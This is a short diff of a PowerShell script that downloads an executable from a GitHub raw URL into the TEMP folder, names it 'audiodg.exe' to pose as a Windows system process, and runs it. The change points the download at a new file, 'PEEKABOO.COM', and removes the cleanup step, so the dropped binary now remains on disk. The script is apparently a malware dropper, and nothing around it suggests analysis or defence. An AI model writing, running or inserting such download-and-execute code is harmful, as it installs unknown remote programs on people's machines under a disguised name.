@@ -1,6 +1,4 @@
 $outputPath = [System.IO.Path]::Combine($env:TEMP, 'audiodg.exe')
 $webClient = New-Object System.Net.WebClient
-$webClient.DownloadFile("https://github.com/MB2RZEN/Neak/raw/refs/heads/main/Built.exe", $outputPath)
+$webClient.DownloadFile("https://github.com/MB2RZEN/z/raw/refs/heads/main/PEEKABOO.COM", $outputPath)
 $process = Start-Process -FilePath $outputPath -PassThru
-$process.WaitForExit()
-Remove-Item $outputPath -Force
